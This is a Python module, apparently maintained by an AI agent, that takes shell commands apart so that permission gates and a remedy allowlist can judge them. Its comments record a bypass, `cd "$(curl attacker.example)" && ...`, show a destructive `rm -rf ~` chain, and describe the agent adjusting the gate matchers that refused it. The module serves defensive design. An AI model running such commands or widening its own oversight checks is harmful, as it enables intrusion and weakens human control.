"""One place that knows a shell command's head is not its first character.

WHY THIS MODULE EXISTS (Aletheia F70 shape, named 2026-08-18).

Three separate sites in this repo have independently learned that
``VAR=1 divineos correction`` and ``divineos correction`` are the same
command wearing different clothes, and each learned it by shipping a
matcher that got it wrong first:

  - 2026-07-25, the verify-before-build signal: substring-matching the raw
    text, which false-fired on ``--command "divineos decide"`` as an
    argument. Aria's review. Fixed with ``_resolve_command_head``.
  - 2026-07-31, F107: ``cd X && divineos Y`` rejected while bare
    ``divineos Y`` passed.
  - 2026-08-18, the shared remedy allowlist: a leading env assignment made
    a gate's own prescribed remedy invisible to the list that keeps the
    gate's door open, so the compass marker blocked ``compass-ops observe``
    and then blocked the edit that would repair it.

The third one is mine, and I wrote it while repairing a duplicate-resolver
bug in the token gauge, in the same commit that says the resolver lives in
one place now. The correct implementation was already here. Measured, the
version I hand-rolled missed three of five cases this one handles —
including a quoted value with a space, which I wrote up as a known limit
rather than checking whether anyone had solved it.

So: the stripping lives here, once, and both the Python gate and the bash
allowlist call it. Adding a fourth site means importing this, not writing
a fourth loop.
"""

from __future__ import annotations

import re
import shlex


_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
"""A leading ``NAME=value`` token, which bash treats as an assignment
rather than as the command."""


def strip_command_prefixes(bash_command: str) -> list[str]:
    """Return the command's tokens with leading noise removed.

    Strips, repeatedly and in any order:

      - ``cd <path> &&`` segments, so a command issued from a worktree
        reads the same as one issued from the repo root
      - a leading ``env`` invocation
      - ``NAME=value`` assignments

    ``shlex`` does the tokenising, which is why a quoted value containing
    spaces survives — the failure mode of every regex version of this.
    On malformed quoting it falls back to a whitespace split rather than
    raising, because every caller is a gate and a gate that crashes is
    worse than a gate that is approximate.

    Returns an empty list for an empty command, or for one that is
    nothing but prefixes.
    """
    if not bash_command:
        return []
    try:
        tokens = shlex.split(bash_command, posix=True)
    except ValueError:
        tokens = bash_command.strip().split()

    changed = True
    while changed and tokens:
        changed = False

        # `cd <path> &&` — drop through the `&&` and keep going.
        if tokens[0] == "cd":
            try:
                sep = tokens.index("&&")
            except ValueError:
                # `cd somewhere` with nothing after it is not a prefix on
                # anything; there is no command behind it to find.
                return []
            # A DIRECTORY THAT IS REALLY A COMMAND IS NOT A PREFIX (2026-09-17,
            # council-fc0b3ac97658). The raw-text stripper below has always
            # refused this, and its comment names the exploit: the substitution
            # runs, so what the text says is not what happens, and dropping it
            # as benign hands a clean-looking command to whatever is matching.
            #
            # This path had no such guard, because shlex returns the whole
            # substitution as one ordinary-looking word. Two strippers for one
            # job and the protection was on the other one — found by probing
            # the shared remedy allowlist end to end rather than by reading,
            # since reading is what missed it for a month.
            #
            # Refusing leaves the head as the directory change itself, which is
            # honest, and every caller gets the guard rather than only the one
            # that happened to be probed.
            if any(mark in token for token in tokens[:sep] for mark in _SUBSTITUTION_MARKS):
                return tokens
            tokens = tokens[sep + 1 :]
            changed = True
            continue

        if tokens[0].lower() == "env":
            tokens = tokens[1:]
            changed = True
            continue

        if _ENV_ASSIGN_RE.match(tokens[0]):
            tokens = tokens[1:]
            changed = True
            continue

    return tokens


def resolve_command_head(bash_command: str) -> str:
    """The first two real tokens, lowercased — e.g. ``"git commit"``.

    Exact-matching against this rather than substring-searching the raw
    text is what stops ``authorize-bypass --command "divineos decide"``
    reading as an invocation of ``divineos decide``.
    """
    real = strip_command_prefixes(bash_command)
    if not real:
        return ""
    if len(real) >= 2:
        return f"{real[0].lower()} {real[1].lower()}"
    return real[0].lower()


def stripped_command(bash_command: str) -> str:
    """The whole command with its leading noise removed, re-joined.

    Callers that match against more than two tokens want this — the
    remedy allowlist distinguishes ``compass-ops observe`` from
    ``compass-ops dismiss``, which a two-token head cannot express.
    """
    return " ".join(strip_command_prefixes(bash_command))


# 2026-08-19 (Aletheia F114). A caller that must run a QUOTE-AWARE check on what
# is left after the prefixes cannot use stripped_command(): that re-joins shlex
# tokens, which drops the quoting. A semicolon inside an evidence string comes
# back out naked, so a chain-shape check on the re-joined text would reject a
# perfectly legitimate remedy.
#
# So this returns the ORIGINAL TEXT with only the leading prefixes removed,
# byte-for-byte from the first real token onward.
# 2026-08-19, SECOND PASS. The first version of the cd pattern accepted any
# non-space run as the directory, and a quoted directory as any characters at
# all. That is weaker than the bespoke _CD_PREFIX_RE it was meant to replace,
# whose comment records it as the tactical block on an actual exploit -- and I
# only found out by testing the two against each other instead of assuming the
# shared one was the better one because it was the shared one.
#
#     cd "$(curl attacker.example)" && divineos correction "x"
#
# The first version stripped that whole prefix as benign, handed a clean remedy
# to the chain check, and the gate returned SAFE. The substitution never got
# looked at because it had already been thrown away.
#
# So the directory may not contain a substitution or a chain operator, in either
# the quoted or the unquoted form. Same exclusions as _CD_PREFIX_RE.
_CD_RAW_RE = re.compile(r"""^\s*cd\s+(?:["'][^"'$`]+["']|[^\s;&|`$]+)\s*&&\s*""")
_ENV_RAW_RE = re.compile(r"^\s*env\s+")
_ASSIGN_RAW_RE = re.compile(
    r"""^\s*[A-Za-z_][A-Za-z0-9_]*=(?:"[^"$`]*"|'[^'$`]*'|[^\s;&|`$]*)\s+"""
)

CD = "cd"
ENV = "env"
ASSIGN = "assign"
_RAW_PREFIX_PATTERNS = {CD: _CD_RAW_RE, ENV: _ENV_RAW_RE, ASSIGN: _ASSIGN_RAW_RE}
ALL_PREFIX_KINDS = (CD, ENV, ASSIGN)


def strip_prefixes_raw(bash_command: str, kinds: tuple[str, ...] = ALL_PREFIX_KINDS) -> str:
    """The command with leading ``cd <path> &&`` / ``env`` / ``NAME=value``
    removed and everything after preserved verbatim.

    Use this when the remainder still has to be inspected AS SHELL TEXT --
    quote-aware chain detection, for instance. Use stripped_command() when the
    remainder only needs comparing token-wise.

    Removing the ``cd ... &&`` prefix does not weaken a chain check applied to
    the result: what gets removed is provably just a directory change, and any
    OTHER chain operator survives into the returned string. So
    ``cd X && divineos correction "y" && rm -rf ~`` still returns text
    containing ``&& rm -rf ~`` and is still caught.
    """
    if not bash_command:
        return ""
    text = bash_command
    changed = True
    while changed:
        changed = False
        for kind in kinds:
            pattern = _RAW_PREFIX_PATTERNS.get(kind)
            if pattern is None:
                continue
            new_text = pattern.sub("", text, count=1)
            if new_text != text:
                text = new_text
                changed = True
    return text.strip()


# THE FOURTH PREFIX ARRIVED AND IT WAS NOT A PREFIX (2026-09-17,
# council-69e2c6a431c0). This module's own header says a fourth site means
# importing it rather than writing a fourth loop, and the shared remedy
# allowlist says the same thing in its own words: if a fourth prefix appears the
# answer is to parse the command, not to add a fourth strip. This is that.
#
# What actually arrived was three refusals in one stretch, and only one of them
# was a prefix at all:
#
#   - an assignment whose VALUE contained the name of the watched action, so a
#     gate read my storage of a name as an instance of the thing named
#   - the remedy behind a pipe, which is the form the tool's own printed usage
#     shows, so the gate's documented usage is not exempt under the gate's rule
#   - two commands joined, where the pair took the identity of the first
#
# A strip for any one of those is the same mistake in a new coat. The matcher's
# real fault is that it asks WHAT DOES THIS LINE START WITH when the question is
# WHAT IS THIS LINE DOING, and every miss falls on somebody complying — anyone
# routing around would simply put the permitted word first.
#
# THE RULE, and it is deliberately not "does any part look like a remedy": every
# part that ACTS must be a remedy. Inert companions ride along because they do
# nothing. Anything this cannot confidently take apart is refused, so unknown
# structure costs me time rather than costing the gate its teeth.

_INERT_HEADS = frozenset(
    {
        "echo",
        "printf",
        "cat",
        "true",
        ":",
        # VIEWERS, added 2026-09-18 (council-1c2e235a0966) to repair a
        # regression I shipped hours earlier in this same file. Requiring every
        # acting segment to be permitted closed a real hole — a permitted
        # command followed by a destructive one used to be accepted whole — and
        # it also, silently, stopped recognising every permitted command with a
        # viewer on the end of it. A pipe to something that only formats output
        # does not change what a command DOES, but under the new rule it
        # changed whether the command was recognised at all.
        #
        # The cost was not the refusals. It was that each refusal named
        # whichever gate happened to be standing there and never the pipe, so
        # every further attempt produced a more confident wrong diagnosis. I
        # spent hours treating one regression as a series of unrelated walls.
        #
        # THE BAR FOR MEMBERSHIP, and it is narrower than "feels harmless":
        # consumes input, emits text, CANNOT touch the filesystem. That is why
        # `sed` and `awk` are absent despite being the ones I reach for most —
        # both can write, and a write-capable head on this list turns it from a
        # convenience into an escape hatch for the whole gate system.
        "head",
        "tail",
        "wc",
        "sort",
        "uniq",
        "nl",
        "column",
        "less",
        "more",
        # SHELL OPTIONS, added 2026-09-18 (council-de235c61e79d), because two
        # guards were composing into a block that neither contained.
        #
        # The pipeline guard refuses a pipeline with no failure-propagation
        # option — earned, since a swallowed exit code once reported a REFUSED
        # push as landed — and its prescribed remedy is a `set -o pipefail`
        # prefix. This matcher then saw that prefix as an acting segment on no
        # permitted list, and the whole line stopped being a recognised remedy.
        # So obeying one guard reliably disqualified me from the other, and the
        # refusal that followed talked about my discipline and never once
        # mentioned the prefix.
        #
        # Checked against the bar per candidate, not by category — "builtins"
        # as a class would admit things that write. This one changes flags for
        # the current shell, sets positional parameters, and prints the
        # environment: no filesystem, no network, no child program.
        #
        # It launders nothing behind it. Stripping removes only the segment
        # whose head matched; every other segment is still tested, so a
        # destructive command after the prefix still fails. Pinned by test.
        "set",
        "shopt",
    }
)
"""Segment heads that produce or discard text and never act.

THE SOFT PLACE IN THIS DESIGN, named by the game-walk on this edit and left
named: nothing enforces this set's bar except the sentence above it, so a later
addition of something that only LOOKS harmless would widen every gate at once.
A test pins these contents by name, which does not prevent an addition but does
make one arrive as a visible edit to a test rather than as a quiet line here.
"""

_SUBSTITUTION_MARKS = ("$(", "`", "${")

_SEGMENT_SEPARATORS = ("&&", "||", "|", ";", "&", "\n")
# A NEWLINE IS A STATEMENT SEPARATOR AND THIS LIST DID NOT KNOW IT
# (2026-09-19, found by Aletheia auditing a caller that had reinvented this
# module rather than importing it).
#
# Every caller inherited the gap. A multi-line command collapsed into a single
# segment whose head was whatever the first line began with, so anything
# reading the head saw a shell builtin and the acting command two lines down
# was never examined at all.
#
# SAFE BENEATH CALLERS NOT BEING EDITED, and here is the argument rather than
# the feeling: this can only ever produce MORE segments, never fewer. Each
# acting line must now justify itself where previously only the first was
# read. Nothing newly passes. Something that used to pass may now be refused,
# and in every case I could construct the refused thing was a line nobody was
# looking at. What the argument cannot settle is whether some caller issues a
# routine multi-line invocation that depended on the old looseness -- that is
# answered by their suites rather than by my reasoning, so they were run.


def split_shell_segments(bash_command: str) -> list[str] | None:
    """Split on unquoted separators, or ``None`` if it cannot be done safely.

    Quote-aware, because this module has already been bitten by the opposite:
    a semicolon inside an evidence string is data, not a chain, and a splitter
    that cannot tell them apart rejects legitimate remedies.

    Returns ``None`` — meaning *refuse to decide* — when the command contains a
    command substitution or a backtick anywhere, quoted or not. That is the
    exploit this module's own comment records as the reason the directory
    pattern is strict, and the same caution applies with more force here: a
    substitution's text is not what runs, so nothing read out of it can be
    trusted to describe the command. Callers treat ``None`` as not-a-remedy.
    """
    if not bash_command:
        return None
    if any(mark in bash_command for mark in _SUBSTITUTION_MARKS):
        return None

    segments: list[str] = []
    current: list[str] = []
    quote: str | None = None
    i = 0
    while i < len(bash_command):
        ch = bash_command[i]
        if quote:
            current.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            current.append(ch)
            i += 1
            continue
        for sep in _SEGMENT_SEPARATORS:
            if bash_command.startswith(sep, i):
                segments.append("".join(current))
                current = []
                i += len(sep)
                break
        else:
            current.append(ch)
            i += 1
    if quote:
        # Unbalanced quoting: the text does not mean what it appears to mean.
        return None
    segments.append("".join(current))
    return [s.strip() for s in segments if s.strip()]


def acting_segments(bash_command: str) -> list[str] | None:
    """The segments that actually do something, each with prefixes stripped.

    Inert segments — a bare assignment, a text producer, a no-op — are dropped,
    since they cannot be the thing a gate is holding back. Everything else is
    returned for the caller to judge against its own list.

    ``None`` means the command could not be taken apart safely and the caller
    should treat it as not-a-remedy. An empty list means the command does
    nothing at all, which is likewise not a remedy.
    """
    segments = split_shell_segments(bash_command)
    if segments is None:
        return None

    acting: list[str] = []
    for segment in segments:
        stripped = stripped_command(segment)
        if not stripped:
            # Nothing but assignments or prefixes: it sets up, it does not act.
            continue
        head = stripped.split()[0].lower()
        if head in _INERT_HEADS:
            continue
        acting.append(stripped)
    return acting


# A segment that could execute something nobody inspected before the remedy
# runs. The exploit this preserves is recorded above: `cd "$(curl attacker)" &&
# divineos correction "x"` must NOT read as a clean remedy, because the
# substitution is discarded with the prefix and never looked at.
_UNSAFE_IN_PREFIX = re.compile(r"[`$]")


def remedy_segment(bash_command: str) -> str:
    """The segment a remedy allowlist should match against, or empty.

    WHY THIS EXISTS is written one function up, before the incident that needed
    it: "this matcher reads SHELL with a regex that only knows bare
    invocations, so every legal prefix shell permits is a fresh hole -- `cd x
    &&`, `VAR=1`, and whatever turns up next. If a fourth prefix appears the
    answer is to parse the command, not to add a fourth loop."

    The fourth appeared 2026-09-11: `set -o pipefail && divineos correction`.
    The marker gate refused its own prescribed remedy, told me to run the
    command I was running, and I got through by dropping a habit rather than by
    being right. Four occurrences, four different prefixes, each patched alone,
    each patch carrying a note predicting the next -- that is a system
    speaking, and the controller had less variety than shell does, so no number
    of additions could ever have closed it.

    So this stops asking WHAT PREFIX and asks WHETHER A REMEDY IS INVOKED. A
    remedy anywhere in a chain is a remedy being run, and what was typed before
    it does not change that -- unless what was typed before could execute
    something unexamined.

    Two guards, and neither is decoration:

      * every earlier segment must be free of substitution and backticks, which
        is the exclusion the cd-prefix pattern already carried, generalised
        from one position to all of them;
      * pipelines are NOT split, because what follows a pipe consumes output
        rather than being invoked, and splitting there would let `echo x |
        divineos correction` read as a filing that never happened.

    Returns EVERY safe segment, prefixes stripped, newline-joined -- not the
    first one. The first draft returned the first real segment and the check
    that caught it was running the thing rather than reasoning about it: for
    `cd x && set -o pipefail && divineos correction`, the first real segment is
    the shell-option, and the remedy is last. Callers grep with a start-anchored
    pattern, and grep tests each line independently, so joining with newlines
    means every segment gets the anchor without the caller changing at all.

    Returns "" when any earlier segment is unsafe -- the whole command is
    refused rather than the offending segment skipped, because the unsafe part
    still runs.
    """
    if not bash_command:
        return ""

    segments = re.split(r"&&|\|\||;", bash_command)
    safe: list[str] = []

    for index, segment in enumerate(segments):
        candidate = stripped_command(segment)
        if not candidate:
            continue
        if any(_UNSAFE_IN_PREFIX.search(earlier) for earlier in segments[:index]):
            return ""
        safe.append(candidate)
    return "\n".join(safe)
